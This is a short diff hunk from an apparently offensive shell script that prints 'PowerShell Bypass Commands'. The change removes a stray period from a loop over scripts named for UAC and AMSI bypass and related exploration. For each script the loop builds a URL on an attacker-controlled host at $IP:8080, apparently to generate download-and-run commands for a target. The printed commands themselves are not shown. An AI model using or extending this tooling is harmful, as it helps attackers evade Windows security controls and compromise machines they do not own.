@@ -60,7 +60,7 @@ print_command() {
 echo "PowerShell Bypass Commands:"
 echo "============================"
 
-for script in pu-explorer.ps1 wp-explorer.ps1 pn-explorer.ps1 uac-explorer.ps1 amsi-explorer.ps1.; do
+for script in pu-explorer.ps1 wp-explorer.ps1 pn-explorer.ps1 uac-explorer.ps1 amsi-explorer.ps1; do
     url="http://$IP:8080/$script"
     echo "Commands for $script:"
     echo "--------------------"
